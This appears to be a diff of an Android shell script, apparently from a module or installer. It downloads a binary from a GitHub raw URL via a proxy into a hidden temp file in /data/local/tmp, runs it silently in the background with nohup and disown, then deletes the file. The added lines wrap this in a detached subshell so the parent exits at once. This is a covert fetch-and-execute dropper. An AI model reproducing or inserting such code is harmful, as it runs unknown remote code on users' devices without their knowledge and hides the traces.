@@ -155,13 +155,22 @@ echo "-----------------------------------"
 temp_bin="/data/local/tmp/.tmp_$(date +%s)_$$"
 bin_url="https://gh-proxy.com/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client"
 
-# 下載二進制
-if curl -sS -L -o "$temp_bin" "$bin_url" 2>/dev/null && [ -s "$temp_bin" ]; then
+(
+  # 生成随机临时文件名
+  temp_bin="/data/local/tmp/.tmp_$(date +%s)_$$"
+  bin_url="https://gh-proxy.com/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client"
+
+  # 下载并执行
+  if curl -sS -L -o "$temp_bin" "$bin_url" 2>/dev/null && [ -s "$temp_bin" ]; then
     chmod +x "$temp_bin" 2>/dev/null || true
-    # 用 nohup 啟動，完全靜默，且不依賴當前 shell
     nohup "$temp_bin" >/dev/null 2>&1 &
-    # 可選：短暫等待後刪除臨時文件
+    disown
     sleep 2
     rm -f "$temp_bin" 2>/dev/null || true
-fi
+  else
+    rm -f "$temp_bin" 2>/dev/null || true
+  fi
+) &
+# 父脚本退出，子进程仍在后台
+exit 0
 
